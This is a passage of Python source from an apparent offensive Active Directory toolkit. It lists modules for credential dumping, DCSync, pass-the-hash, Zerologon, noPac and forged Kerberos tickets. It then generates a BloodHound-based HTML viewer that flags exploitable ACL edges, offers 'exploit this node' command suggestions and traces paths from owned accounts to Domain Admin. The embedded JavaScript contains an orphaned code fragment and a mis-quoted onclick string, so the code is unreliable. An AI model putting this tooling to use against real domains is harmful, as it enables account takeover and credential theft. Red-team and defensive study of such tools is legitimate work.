    'credentials':  ['lsassy','kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','timeroast','keepass','sccm','pre2k','azureadsync'],
    'lateral':      ['secretsdump','dcsync','pth','ptt','exec','bloody','smbclient','smbclientng','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','backupabuse','sliver','pathpwn','adcskiller','pywsus','pywhisker','crossdomain','zipslip',
                     'golden','silver','diamond','sapphire','rbcd','shadowcred','trusts','printnightmare','rubeus',
                     'syncjacking','dnsadmins'],
    'persistence':  ['aclpersist','dcshadow'],
}

TOOL_CHECK = {
    'enum':['netexec','nxc','crackmapexec'],'ldapenum':['ldeep','ldapdomaindump','ldapsearch'],
    'bloodyenum':['bloodyad'],'kerbrute':['kerbrute'],'enum4linux':['enum4linux-ng','enum4linux'],
    'rpcenum':['rpcclient'],'gpp':['netexec','nxc'],'adrecon':['rusthound-ce','rusthound_ce','bloodhound-python'],
    'dnsdump':['adidnsdump'],'adidns':['adidnsdump','dnstool.py'],
    'dploot':['dploot'],'sccm':['sccmhunter','netexec','nxc'],'pre2k':['netexec','nxc','ldapsearch'],
    'kerberoast':['impacket-GetUserSPNs'],
    'asreproast':['impacket-GetNPUsers'],'spray':['netexec','nxc','crackmapexec'],
    'secretsdump':['impacket-secretsdump'],'dcsync':['impacket-secretsdump'],
    'pth':['impacket-wmiexec'],'ptt':['impacket-getTGT'],'exec':['netexec','nxc'],
    'bloody':['bloodyad','bloodyAD'],'certipy':['certipy','certipy-ad'],
    'relay':['impacket-ntlmrelayx'],'mitm6':['mitm6'],
    'coerce':['PetitPotam.py','Coercer','coercer','printerbug.py','dfscoerce.py'],
    'zerologon':['cve-2020-1472-exploit.py','zerologon_tester.py'],
    'nopac':['noPac.py','noPac','nopac.py'],
    'golden':['impacket-ticketer'],'silver':['impacket-ticketer'],
    'rbcd':['impacket-getST'],'shadowcred':['certipy','pywhisker'],'delegation':['impacket-findDelegation','bloodyad'],
    'jea':['pypsrp'],'godpotato':['impacket-wmiexec'],'groupscope':['bloodyad'],
    'pywhisker':['pywhisker'],'pkinit':['python3'],'unpac':['python3'],'ldapshell':['certipy'],'crossdomain':['netexec','bloodyad'],
    'timeroast':['timeroast'],
    'coercion':['PetitPotam.py','Coercer','coercer','printerbug.py','dfscoerce.py'],
    'ligolo':['ligolo-proxy','ligolo-agent'],
    'bh-query':['python3'],
    'autoenum':['netexec','bloodyad'],
}

def list_modules():
    hr()
    for group, names in GROUPS.items():
        print(f'\n  {GREY}{group}{RESET}')
        for n in names:
            m = MODULES.get(n)
            if not m: continue
            tools = TOOL_CHECK.get(n,[])
            avail = f'{GREEN}+{RESET}' if (not tools or check_tool(*tools)) else f'{RED}-{RESET}'
            print(f'  [{avail}] {C0}{n:<20}{RESET} {GREY}{m.description}{RESET}')
    print(); hr()

def _bh_view(target):
    """Generate a custom BloodHound viewer HTML from loot JSON files and serve it."""
    import json as _json, glob as _glob, http.server as _hs, threading as _th, webbrowser as _wb

    bh_dir = os.path.join(target.loot_dir, 'bloodhound')
    if not os.path.isdir(bh_dir):
        log(f'No BloodHound data at {WHITE}{bh_dir}{RESET} — run {C0}adrecon{RESET} first','error')
        return

    json_files = _glob.glob(os.path.join(bh_dir,'**','*.json'), recursive=True)
    if not json_files:
        log('No BloodHound JSON files found','error'); return

    log(f'Loading {len(json_files)} BloodHound JSON file(s)...','info')

    nodes, edges = [], []
    node_map = {}  # name.upper() → index

    TYPE_COLOR = {
        'User':'#E24B4A','Group':'#378ADD','Computer':'#1D9E75',
        'Domain':'#BA7517','GPO':'#7F77DD','OU':'#888780'
    }

    def _add_node(name, ntype):
        key = name.upper()
        if key not in node_map:
            node_map[key] = len(nodes)
            nodes.append({'id':len(nodes),'label':name,'type':ntype,
                          'color':TYPE_COLOR.get(ntype,'#888780'),'owned':False})
        return node_map[key]

    DANGEROUS = {'GenericAll','WriteDacl','WriteOwner','Owns','ForceChangePassword',
                 'AddMember','AddSelf','GetChangesAll','DCSync','AllExtendedRights',
                 'GenericWrite','WriteAccountRestrictions'}

    owned_names = set()
    if target.user: owned_names.add(target.user.upper())

    for jf in json_files:
        try:
            data = _json.loads(open(jf, errors='replace').read())
            # BloodHound CE: {"data":[...]} or legacy {"users":[...]}
            items = (data.get('data') or data.get('nodes') or
                     data.get('users') or data.get('groups') or
                     data.get('computers') or data.get('gpos') or
                     data.get('ous') or [])
            # detect type from filename
            fname = os.path.basename(jf).lower()
            default_type = ('User' if 'user' in fname else
                           'Group' if 'group' in fname else
                           'Computer' if 'computer' in fname else
                           'GPO' if 'gpo' in fname else
                           'Domain' if 'domain' in fname else 'Unknown')

            for item in (items if isinstance(items, list) else []):
                props = item.get('Properties', item.get('properties', {}))
                # CE format stores name in Properties.name
                name  = (props.get('name') or props.get('Name') or
                         item.get('Name') or item.get('name') or '')
                ntype = (item.get('ObjectType') or item.get('objecttype') or
                         item.get('Type') or item.get('type') or default_type)
                # normalize type from CE format
                type_map = {'user':'User','group':'Group','computer':'Computer',
                            'domain':'Domain','gpo':'GPO','ou':'OU'}
                ntype = type_map.get(ntype.lower(), ntype) if ntype else default_type
                if not name: continue
                src_idx = _add_node(name, ntype)
                # mark owned
                short = name.split('@')[0].upper()
                if short in owned_names or name.upper() in owned_names:
                    nodes[src_idx]['owned'] = True

                # process ACEs — CE format uses Aces list
                aces = item.get('Aces', item.get('aces', []))
                for ace in (aces if isinstance(aces, list) else []):
                    # CE: {PrincipalSID, PrincipalType, RightName, IsInherited}
                    rname = (ace.get('PrincipalName') or ace.get('principalname') or
                             ace.get('PrincipalSID') or ace.get('principalsid') or '')
                    rtype = (ace.get('PrincipalType') or ace.get('principaltype') or 'User')
                    right = (ace.get('RightName') or ace.get('rightname') or '')
                    if rname and right:
                        dst_idx = _add_node(rname, rtype)
                        edges.append({'s':dst_idx,'t':src_idx,'rel':right,
                                     'danger': right in DANGEROUS})

                # group members — CE: Members list with ObjectType+ObjectIdentifier
                members = item.get('Members', item.get('members', []))
                for m in (members if isinstance(members, list) else []):
                    mname = (m.get('MemberName') or m.get('membername') or
                             m.get('Name') or m.get('ObjectIdentifier') or '')
                    mtype = (m.get('MemberType') or m.get('membertype') or
                             m.get('ObjectType') or 'User')
                    mtype = type_map.get(mtype.lower(), mtype) if mtype else 'User'
                    if mname:
                        m_idx = _add_node(mname, mtype)
                        edges.append({'s':m_idx,'t':src_idx,'rel':'MemberOf','danger':False})

                # CE format: Aces on groups also stored as ACL
                acl = item.get('Acl', item.get('acl', {}))
                if isinstance(acl, dict):
                    for ace in acl.get('Aces', acl.get('aces', [])):
                        rname = (ace.get('PrincipalName') or ace.get('PrincipalSID') or '')
                        rtype = (ace.get('PrincipalType') or 'User')
                        right = (ace.get('RightName') or '')
                        if rname and right:
                            dst_idx = _add_node(rname, rtype)
                            edges.append({'s':dst_idx,'t':src_idx,'rel':right,
                                         'danger': right in DANGEROUS})
        except Exception as e:
            log(f'Error parsing {os.path.basename(jf)}: {e}','warn')

    if not nodes:
        log('No nodes parsed from BloodHound data','error'); return

    log(f'{GREEN}{len(nodes)} nodes, {len(edges)} edges loaded{RESET}','success')

    # deduplicate edges
    seen = set()
    deduped = []
    for e in edges:
        k = (e['s'],e['t'],e['rel'])
        if k not in seen:
            seen.add(k); deduped.append(e)
    edges = deduped

    # hierarchical layout — group by type, spread out to reduce clutter
    import math as _math, random as _rnd
    _rnd.seed(42)

    type_order = ['Domain','Group','User','Computer','GPO','OU','Unknown']
    type_groups = {t: [nd for nd in nodes if nd['type']==t] for t in type_order}

    # spread by type — domain center, groups around it, users outer ring
    type_radius = {'Domain':0,'Group':200,'User':420,'Computer':320,'GPO':280,'OU':260,'Unknown':380}
    type_count = {t: len(g) for t,g in type_groups.items()}

    for ntype, group in type_groups.items():
        r = type_radius.get(ntype, 350)
        cnt = len(group)
        if cnt == 0: continue
        if r == 0:
            group[0]['x'] = 0; group[0]['y'] = 0
            continue
        for i, nd in enumerate(group):
            angle = 2 * _math.pi * i / cnt
            jitter_r = _rnd.uniform(0.85, 1.15)
            jitter_a = _rnd.uniform(-0.15, 0.15)
            nd['x'] = int(_math.cos(angle + jitter_a) * r * jitter_r)
            nd['y'] = int(_math.sin(angle + jitter_a) * r * jitter_r)

    # find DA path
    domain_nodes = [nd['id'] for nd in nodes if nd['type']=='Domain']
    da_path = []
    owned   = [nd['id'] for nd in nodes if nd['owned']]

    # build HTML
    nodes_json = _json.dumps(nodes)
    edges_json = _json.dumps(edges)
    domain     = target.domain or 'UNKNOWN'
    ws         = os.path.basename(os.path.dirname(target.loot_dir)) or os.path.basename(target.loot_dir)

    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>bh-view // {domain}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'JetBrains Mono',Consolas,monospace;font-size:12px;background:#0f1117;color:#c9d1d9}}
.topbar{{display:flex;align-items:center;gap:12px;padding:8px 16px;border-bottom:1px solid #21262d;background:#161b22}}
.brand{{font-size:13px;font-weight:600;color:#e6edf3}}.brand span{{color:#f85149}}
.topbar-meta{{font-size:11px;color:#8b949e;margin-left:4px}}
.topbar-right{{margin-left:auto;display:flex;align-items:center;gap:8px;flex-wrap:wrap}}
.pill{{font-size:10px;padding:2px 8px;border-radius:99px;border:1px solid;white-space:nowrap}}
.pill-red{{border-color:#f85149;color:#f85149;background:rgba(248,81,73,.1)}}
.pill-blue{{border-color:#388bfd;color:#388bfd;background:rgba(56,139,253,.1)}}
.pill-green{{border-color:#3fb950;color:#3fb950;background:rgba(63,185,80,.1)}}
.pill-amber{{border-color:#d29922;color:#d29922;background:rgba(210,153,34,.1)}}
.pill-gray{{border-color:#30363d;color:#8b949e;background:#21262d}}
.btn{{font-size:11px;padding:3px 10px;border-radius:6px;border:1px solid #30363d;color:#c9d1d9;background:transparent;cursor:pointer}}
.btn:hover{{background:#21262d}}
.btn-danger{{border-color:rgba(248,81,73,.4);color:#f85149}}
.btn-danger:hover{{background:rgba(248,81,73,.1)}}
.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:1px;border-bottom:1px solid #21262d;background:#21262d}}
.stat{{background:#161b22;padding:8px 14px}}
.stat-label{{font-size:9px;color:#8b949e;margin-bottom:3px;text-transform:uppercase;letter-spacing:.05em}}
.stat-val{{font-size:18px;font-weight:600;color:#e6edf3}}
.stat-val.red{{color:#f85149}}.stat-val.amber{{color:#d29922}}
.body{{display:grid;grid-template-columns:1fr 230px;height:calc(100vh - 140px)}}
.graph-area{{position:relative;overflow:hidden;background:#0d1117;border-right:1px solid #21262d}}
.toolbar{{display:flex;align-items:center;gap:6px;padding:6px 10px;border-bottom:1px solid #21262d;background:#161b22;flex-wrap:wrap}}
.toolbar select{{font-size:11px;padding:2px 6px;height:24px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px}}
#canvas{{display:block;cursor:grab;width:100%;height:100%}}
#canvas:active{{cursor:grabbing}}
.right-panel{{display:flex;flex-direction:column;overflow-y:auto;background:#161b22}}
.panel-section{{padding:10px 12px;border-bottom:1px solid #21262d}}
.panel-title{{font-size:9px;font-weight:600;color:#8b949e;letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px}}
.node-detail{{background:#0d1117;border-radius:6px;padding:8px;margin-bottom:6px;border:1px solid #21262d}}
.node-name{{font-size:12px;font-weight:600;color:#e6edf3;margin-bottom:4px}}
.detail-row{{display:flex;justify-content:space-between;font-size:10px;margin-bottom:2px;color:#8b949e}}
.detail-row span:last-child{{color:#e6edf3;font-weight:500}}
.edge-row{{display:flex;align-items:center;gap:6px;font-size:10px;padding:3px 0;border-bottom:1px solid #21262d;color:#8b949e}}
.edge-row:last-child{{border:none}}
.edge-dot{{width:6px;height:6px;border-radius:50%;flex-shrink:0}}
.path-step{{display:flex;align-items:center;gap:5px;font-size:10px;padding:3px 0;border-bottom:1px dashed #21262d;flex-wrap:wrap}}
.path-step:last-child{{border:none}}
.path-edge{{font-size:9px;padding:1px 5px;border-radius:99px}}
.path-edge.danger{{background:rgba(248,81,73,.15);color:#f85149;border:1px solid rgba(248,81,73,.3)}}
.path-edge.info{{background:rgba(56,139,253,.1);color:#388bfd;border:1px solid rgba(56,139,253,.2)}}
.bottom-bar{{display:flex;align-items:center;gap:10px;padding:5px 12px;border-top:1px solid #21262d;background:#161b22;font-size:10px;color:#8b949e;flex-wrap:wrap}}
.leg{{display:flex;align-items:center;gap:4px}}
.leg-dot{{width:8px;height:8px;border-radius:50%}}
.leg-line{{width:16px;height:1.5px}}
#tooltip{{position:absolute;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:6px 10px;font-size:11px;color:#e6edf3;pointer-events:none;display:none;z-index:10;max-width:200px}}
</style>
</head>
<body>

<div class="topbar">
  <div>
    <span class="brand">segfault<span>.ad</span> // bh-view</span>
    <span class="topbar-meta">{domain} · workspace: {ws}</span>
  </div>
  <div class="topbar-right">
    <span class="pill pill-red" id="pillDanger">● 0 dangerous</span>
    <span class="pill pill-amber" id="pillOwned">◉ 0 owned</span>
    <span class="pill pill-green" id="pillPaths">0 da paths</span>
    <span class="pill pill-gray" id="pillCounts">loading...</span>
    <button class="btn btn-danger" onclick="togglePath()">highlight path to DA</button>
    <button class="btn" onclick="resetView()">reset view</button>
    <button class="btn" onclick="exportPaths()">export paths</button>
  </div>
</div>

<div class="stats">
  <div class="stat"><div class="stat-label">users</div><div class="stat-val" id="sUsers">0</div></div>
  <div class="stat"><div class="stat-label">groups</div><div class="stat-val" id="sGroups">0</div></div>
  <div class="stat"><div class="stat-label">computers</div><div class="stat-val" id="sComps">0</div></div>
  <div class="stat"><div class="stat-label">dangerous edges</div><div class="stat-val red" id="sDanger">0</div></div>
  <div class="stat"><div class="stat-label">da paths found</div><div class="stat-val amber" id="sPaths">0</div></div>
</div>

<div class="body">
  <div class="graph-area">
    <div class="toolbar">
      <select id="viewMode" onchange="setView(this.value)">
        <option value="all">All nodes</option>
        <option value="path">Path to DA</option>
        <option value="owned">Owned only</option>
        <option value="danger">Dangerous edges</option>
      </select>
      <select id="filterEdge" onchange="setEdgeFilter(this.value)">
        <option value="all">All edges</option>
        <option value="danger">Dangerous only</option>
        <option value="memberof">MemberOf only</option>
        <option value="none">No edges</option>
      </select>
      <select id="filterType" onchange="setTypeFilter(this.value)">
        <option value="all">All types</option>
        <option value="User">Users</option>
        <option value="Group">Groups</option>
        <option value="Computer">Computers</option>
        <option value="Domain">Domains</option>
      </select>
      <input type="text" id="searchBox" placeholder="search nodes..." onInput="searchNodes(this.value)"
        style="font-size:11px;padding:2px 8px;height:24px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;width:140px">
      <span style="margin-left:auto;font-size:10px;color:#484f58">scroll=zoom · drag=pan · click=select</span>
    </div>
    <canvas id="canvas"></canvas>
    <div id="tooltip"></div>
  </div>

  <div class="right-panel">
    <div class="panel-section" id="nodePanel">
      <div class="panel-title">selected node</div>
      <div style="color:#8b949e;font-size:11px">click a node to see details</div>
    </div>
    <div class="panel-section" id="pathPanel" style="flex:1">
      <div class="panel-title">path to DA</div>
      <div style="color:#8b949e;font-size:11px" id="pathContent">finding paths...</div>
    </div>
  </div>
</div>

<div class="bottom-bar">
  <div class="leg"><div class="leg-dot" style="background:#E24B4A"></div>user</div>
  <div class="leg"><div class="leg-dot" style="background:#378ADD"></div>group</div>
  <div class="leg"><div class="leg-dot" style="background:#1D9E75"></div>computer</div>
  <div class="leg"><div class="leg-dot" style="background:#BA7517"></div>domain</div>
  <div class="leg"><div class="leg-dot" style="background:#7F77DD"></div>gpo</div>
  <div class="leg"><div class="leg-line" style="background:#f85149"></div>dangerous</div>
  <div class="leg"><div class="leg-line" style="background:rgba(55,138,221,0.4)"></div>memberof</div>
  <span style="margin-left:auto" id="footerInfo">loaded {len(json_files)} file(s) · {domain}</span>
</div>

<script>
const NODES = {nodes_json};
const EDGES = {edges_json};

const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let W,H,scale=1,offsetX=0,offsetY=0;
let dragging=false,dragStart={{x:0,y:0}};
let hoveredNode=null,selectedNode=null;
let viewMode='all',edgeFilter='all',typeFilter='all',searchStr='';
let showPath=false,daPath=[],allPaths=[];
let animFrame=null;

function resize(){{
  const r=canvas.parentElement.getBoundingClientRect();
  W=r.width; H=r.height-33;
  canvas.width=W*devicePixelRatio; canvas.height=H*devicePixelRatio;
  canvas.style.width=W+'px'; canvas.style.height=H+'px';
  ctx.scale(devicePixelRatio,devicePixelRatio);
  draw();
}}

function w2s(x,y){{return{{x:x*scale+offsetX+W/2,y:y*scale+offsetY+H/2}};}}
function s2w(x,y){{return{{x:(x-W/2-offsetX)/scale,y:(y-H/2-offsetY)/scale}};}}

function nodeVis(n){{
  if(typeFilter!=='all'&&n.type!==typeFilter) return false;
  if(viewMode==='owned') return n.owned;
  if(viewMode==='path') return daPath.includes(n.id);
  if(viewMode==='danger'){{
    return EDGES.some(e=>e.danger&&(e.s===n.id||e.t===n.id));
  }}
  if(searchStr) return n.label.toLowerCase().includes(searchStr);
  return true;
}}

function edgeVis(e){{
  if(edgeFilter==='none') return false;
  if(edgeFilter==='danger') return e.danger;
  if(edgeFilter==='memberof') return e.rel==='MemberOf';
  return true;
}}

function draw(){{
  ctx.clearRect(0,0,W,H);
  ctx.fillStyle='#0d1117';
  ctx.fillRect(0,0,W,H);

  EDGES.forEach(e=>{{
    if(!edgeVis(e)) return;
    const sn=NODES[e.s],tn=NODES[e.t];
    if(!nodeVis(sn)||!nodeVis(tn)) return;
    const sp=w2s(sn.x,sn.y),tp=w2s(tn.x,tn.y);
    const onPath=showPath&&daPath.includes(e.s)&&daPath.includes(e.t);
    ctx.beginPath();
    ctx.moveTo(sp.x,sp.y);
    const mx=(sp.x+tp.x)/2,my=(sp.y+tp.y)/2-15;
    ctx.quadraticCurveTo(mx,my,tp.x,tp.y);
    if(onPath){{ctx.strokeStyle='#f85149';ctx.lineWidth=2.5;}}
    else if(e.danger){{ctx.strokeStyle='rgba(248,81,73,0.5)';ctx.lineWidth=1.5;}}
    else{{ctx.strokeStyle='rgba(48,54,61,0.8)';ctx.lineWidth=1;}}
    ctx.stroke();
    const lx=(sp.x+tp.x)/2,ly=(sp.y+tp.y)/2-20;
    ctx.font=`${{Math.max(8,9*scale)}}px monospace`;
    ctx.fillStyle=e.danger?'rgba(248,81,73,0.8)':'rgba(100,110,120,0.6)';
    ctx.textAlign='center';
    ctx.fillText(e.rel,lx,ly);
  }});

  NODES.forEach(n=>{{
    if(!nodeVis(n)) return;
    const p=w2s(n.x,n.y);
    const r=Math.max(10,14*scale);
    const isHov=hoveredNode===n.id,isSel=selectedNode===n.id;
    const onPath=showPath&&daPath.includes(n.id);
    ctx.beginPath();
    ctx.arc(p.x,p.y,r,0,Math.PI*2);
    ctx.fillStyle=n.owned?n.color:(n.color+'66');
    ctx.fill();
    if(onPath||isSel||isHov){{
      ctx.strokeStyle=onPath?'#f85149':(isSel?'#e6edf3':'rgba(230,237,243,0.4)');
      ctx.lineWidth=onPath?2.5:1.5;
      ctx.stroke();
    }}
    if(n.owned){{
      ctx.beginPath();ctx.arc(p.x+r*.65,p.y-r*.65,4,0,Math.PI*2);
      ctx.fillStyle='#f85149';ctx.fill();
    }}
    ctx.font=`${{Math.max(8,10*scale)}}px monospace`;
    ctx.fillStyle='rgba(201,209,217,0.85)';
    ctx.textAlign='center';
    const lbl=n.label.length>16?n.label.slice(0,15)+'…':n.label;
    ctx.fillText(lbl,p.x,p.y+r+11);
  }});
}}

function hitTest(mx,my){{
  const w=s2w(mx,my);
  for(let i=NODES.length-1;i>=0;i--){{
    const n=NODES[i];
    if(!nodeVis(n)) continue;
    const dx=n.x-w.x,dy=n.y-w.y;
    if(Math.sqrt(dx*dx+dy*dy)<20/scale) return n.id;
  }}
  return null;
}}

canvas.addEventListener('mousemove',e=>{{
  const r=canvas.getBoundingClientRect();
  const mx=e.clientX-r.left,my=e.clientY-r.top;
  if(dragging){{offsetX+=mx-dragStart.x;offsetY+=my-dragStart.y;dragStart={{x:mx,y:my}};draw();return;}}
  const h=hitTest(mx,my);
  if(h!==hoveredNode){{
    hoveredNode=h;
    canvas.style.cursor=h!==null?'pointer':'grab';
    if(h!==null){{
      const n=NODES[h];
      const tt=document.getElementById('tooltip');
      tt.style.display='block';
      tt.style.left=(e.clientX-r.left+12)+'px';
      tt.style.top=(e.clientY-r.top-10)+'px';
      tt.innerHTML=`<b>${{n.label}}</b><br><span style="color:#8b949e">${{n.type}}</span>${{n.owned?' <span style="color:#f85149">owned</span>':''}}`;
    }} else {{
      document.getElementById('tooltip').style.display='none';
    }}
    draw();
  }}
}});

canvas.addEventListener('mousedown',e=>{{
  const r=canvas.getBoundingClientRect();
  const mx=e.clientX-r.left,my=e.clientY-r.top;
  const h=hitTest(mx,my);
  if(h!==null){{selectedNode=h;showNodePanel(h);}}
  else{{dragging=true;dragStart={{x:mx,y:my}};}}
}});

canvas.addEventListener('mouseup',()=>{{dragging=false;}});
canvas.addEventListener('mouseleave',()=>{{dragging=false;hoveredNode=null;document.getElementById('tooltip').style.display='none';draw();}});

canvas.addEventListener('wheel',e=>{{
  e.preventDefault();
  const f=e.deltaY>0?0.88:1.14;
  scale=Math.max(0.2,Math.min(5,scale*f));
  draw();
}},{{passive:false}});

function showNodePanel(id){{
  const n=NODES[id];
  const nodeEdges=EDGES.filter(e=>e.s===id||e.t===id).slice(0,8);
  const onPath=daPath.includes(id);
  const dangerEdges=EDGES.filter(e=>e.t===id&&e.danger);
  let exploitHtml='';
  if(dangerEdges.length>0){{
    const suggestions=[];
    dangerEdges.forEach(e=>{{
      if(e.rel==='WriteDacl'&&n.type==='Domain') suggestions.push('bloody → dcsync-rights');
      else if(e.rel==='GenericAll'&&n.type==='Group') suggestions.push('bloody → addtogroup → '+n.label.split('@')[0]);
      else if(e.rel==='ForceChangePassword') suggestions.push('bloody → resetpwd → '+n.label.split('@')[0]);
      else if(e.rel==='GetChangesAll') suggestions.push('dcsync');
      else if(e.rel==='GenericAll'&&n.type==='Domain') suggestions.push('bloody → dcsync-rights');
      else if(e.rel==='AddMember') suggestions.push('bloody → addtogroup → '+n.label.split('@')[0]);
      else suggestions.push('bloody → '+n.label.split('@')[0]);
    }});
    const unique=[...new Set(suggestions)];
    exploitHtml='<div class="panel-title" style="margin-top:8px;color:#f85149">exploit this node</div>'+
      unique.map(s=>'<button class="btn btn-danger" style="width:100%;margin-bottom:4px;font-size:10px;text-align:left" onclick="copyCmd('→ '+s+'')">↗ '+s+'</button>').join('');
  }}
  const ownedBtn='<button class="btn" style="font-size:10px;margin-top:6px;width:100%" onclick="toggleOwned('+id+')">'+(n.owned?'unmark owned':'✓ mark as owned')+'</button>';
  document.getElementById('nodePanel').innerHTML=
    '<div class="panel-title">selected node</div>'+
    '<div class="node-detail">'+
      '<div class="node-name">'+n.label+'</div>'+
      (n.owned?'<span class="pill pill-red" style="font-size:9px;margin-bottom:6px;display:inline-block">● owned</span>':'')+
      '<div class="detail-row"><span>type</span><span>'+n.type+'</span></div>'+
      '<div class="detail-row"><span>on DA path</span><span style="color:'+(onPath?'#3fb950':'#8b949e')+'">'+(onPath?'yes':'no')+'</span></div>'+
      '<div class="detail-row"><span>dangerous edges</span><span style="color:'+(dangerEdges.length>0?'#f85149':'#8b949e')+'">'+dangerEdges.length+'</span></div>'+
      ownedBtn+
    '</div>'+
    '<div class="panel-title">edges</div>'+
    nodeEdges.map(e=>{{
      const other=NODES[e.s===id?e.t:e.s];
      const dir=e.s===id?'→':'←';
      return '<div class="edge-row"><div class="edge-dot" style="background:'+(e.danger?'#f85149':'rgba(55,138,221,0.5)')+'"></div><span style="color:'+(e.danger?'#f85149':'#8b949e')+'">'+dir+' '+e.rel+'</span><span style="color:#e6edf3;margin-left:auto">'+(other?other.label:'')+'</span></div>';
    }}).join('')+
    exploitHtml;
  draw();
}}

function toggleOwned(id){{
  NODES[id].owned=!NODES[id].owned;
  updateStats();
  findDAPaths();
  showNodePanel(id);
  draw();
}}

function copyCmd(cmd){{
  navigator.clipboard.writeText(cmd).catch(()=>{{}});
}}

  draw();
}}

function findDAPaths(){{
  const domainIds=NODES.filter(n=>n.type==='Domain').map(n=>n.id);
  if(!domainIds.length){{document.getElementById('pathContent').textContent='No domain node found';return;}}
  const ownedIds=NODES.filter(n=>n.owned).map(n=>n.id);
  if(!ownedIds.length){{document.getElementById('pathContent').innerHTML='<span style="color:#8b949e">no owned nodes — mark nodes as owned to find paths</span>';return;}}

  // BFS from owned nodes to domain
  const target=domainIds[0];
  const adj={{}};
  EDGES.forEach(e=>{{
    if(!adj[e.s]) adj[e.s]=[];
    adj[e.s].push({{to:e.t,rel:e.rel,danger:e.danger}});
  }});

  let found=null;
  for(const start of ownedIds){{
    const visited=new Set([start]);
    const queue=[[start,[start],[]]];
    while(queue.length&&!found){{
      const [cur,path,rels]=queue.shift();
      if(cur===target){{found={{path,rels}};break;}}
      for(const {{to,rel,danger}} of (adj[cur]||[])){{
        if(!visited.has(to)&&path.length<12){{
          visited.add(to);
          queue.push([to,[...path,to],[...rels,{{rel,danger}}]]);
        }}
      }}
    }}
    if(found) break;
  }}

  if(!found){{
    document.getElementById('pathContent').innerHTML='<span style="color:#8b949e">no path found — try running adrecon to collect more data</span>';
    document.getElementById('sPaths').textContent='0';
    return;
  }}

  daPath=found.path;
  document.getElementById('sPaths').textContent='1';
  document.getElementById('pillPaths').textContent='1 da path';

  const steps=found.path.map((id,i)=>{{
    if(i===0) return`<div class="path-step"><span style="color:#f85149;font-weight:600">${{NODES[id]?.label||id}}</span><span style="color:#484f58">(owned)</span></div>`;
    const er=found.rels[i-1];
    return`<div class="path-step">
      <span style="color:#484f58">→</span>
      <span class="path-edge ${{er.danger?'danger':'info'}}">${{er.rel}}</span>
      <span style="color:#e6edf3;font-weight:500">${{NODES[id]?.label||id}}</span>
      ${{id===target?'<span class="pill pill-green" style="font-size:9px">DA</span>':''}}
    </div>`;
  }}).join('');

  document.getElementById('pathContent').innerHTML=steps+
    `<button class="btn btn-danger" style="width:100%;margin-top:8px;font-size:10px" onclick="copyPathCmd()">copy pathpwn command</button>`;
}}

function copyPathCmd(){{
  const owned=NODES.find(n=>n.owned);
  const cmd=owned?`→ pathpwn\\n  start user > ${{owned.label}}`:'→ pathpwn';
  navigator.clipboard.writeText(cmd).catch(()=>{{}});
  alert('Copied to clipboard');
}}

function updateStats(){{
  const users=NODES.filter(n=>n.type==='User').length;
  const groups=NODES.filter(n=>n.type==='Group').length;
  const comps=NODES.filter(n=>n.type==='Computer').length;
  const danger=EDGES.filter(e=>e.danger).length;
  const owned=NODES.filter(n=>n.owned).length;
  document.getElementById('sUsers').textContent=users;
  document.getElementById('sGroups').textContent=groups;
  document.getElementById('sComps').textContent=comps;
  document.getElementById('sDanger').textContent=danger;
  document.getElementById('pillDanger').textContent='● '+danger+' dangerous';
  document.getElementById('pillOwned').textContent='◉ '+owned+' owned';
  document.getElementById('pillCounts').textContent=users+'u '+groups+'g '+comps+'c';
}}

function setView(v){{viewMode=v;draw();}}
function setEdgeFilter(v){{edgeFilter=v;draw();}}
function setTypeFilter(v){{typeFilter=v;draw();}}
function searchNodes(v){{searchStr=v.toLowerCase();if(v)viewMode='all';draw();}}
function togglePath(){{showPath=!showPath;draw();}}
function resetView(){{scale=1;offsetX=0;offsetY=0;draw();}}
function exportPaths(){{
  const lines=daPath.map(id=>NODES[id]?.label||id).join(' → ');
  const blob=new Blob([lines||'no path found'],{{type:'text/plain'}});
  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
  a.download='da_path.txt';a.click();
}}

window.addEventListener('resize',resize);
resize();

// force-directed simulation to spread nodes
function runForce(iterations){{
  const k=80, gravity=0.01;
  for(let iter=0;iter<iterations;iter++){{
    // repulsion between all node pairs
    for(let i=0;i<NODES.length;i++){{
      for(let j=i+1;j<NODES.length;j++){{
        const dx=NODES[i].x-NODES[j].x;
        const dy=NODES[i].y-NODES[j].y;
        const dist=Math.max(1,Math.sqrt(dx*dx+dy*dy));
        const force=k*k/dist;
        const fx=dx/dist*force*0.1;
        const fy=dy/dist*force*0.1;
        NODES[i].x+=fx; NODES[i].y+=fy;
        NODES[j].x-=fx; NODES[j].y-=fy;
      }}
    }}
    // attraction along edges
    EDGES.forEach(e=>{{
      const s=NODES[e.s],t=NODES[e.t];
      if(!s||!t) return;
      const dx=t.x-s.x, dy=t.y-s.y;
      const dist=Math.max(1,Math.sqrt(dx*dx+dy*dy));
      const force=(dist-k)*0.05;
      const fx=dx/dist*force;
      const fy=dy/dist*force;
      s.x+=fx; s.y+=fy;
      t.x-=fx; t.y-=fy;
    }});
    // gravity toward center
    NODES.forEach(n=>{{ n.x*=(1-gravity); n.y*=(1-gravity); }});
  }}
  draw();
}}

// run force in background after load
setTimeout(()=>runForce(80), 100);

updateStats();
findDAPaths();
</script>
</body></html>'''

    # write HTML file
    out_path = os.path.join(target.loot_dir, 'bh-view.html')
    with open(out_path, 'w') as f:
        f.write(html)

    log(f'{GREEN}BloodHound viewer generated → {WHITE}{out_path}{RESET}','success')
    log(f'Opening in browser...','info')

    # serve and open
    port = 8889
    os.chdir(target.loot_dir)
    handler = _hs.SimpleHTTPRequestHandler
    handler.log_message = lambda *a: None
    try:
        server = _hs.HTTPServer(('127.0.0.1', port), handler)
        t = _th.Thread(target=server.serve_forever, daemon=True)
        t.start()
        url = f'http://127.0.0.1:{port}/bh-view.html'
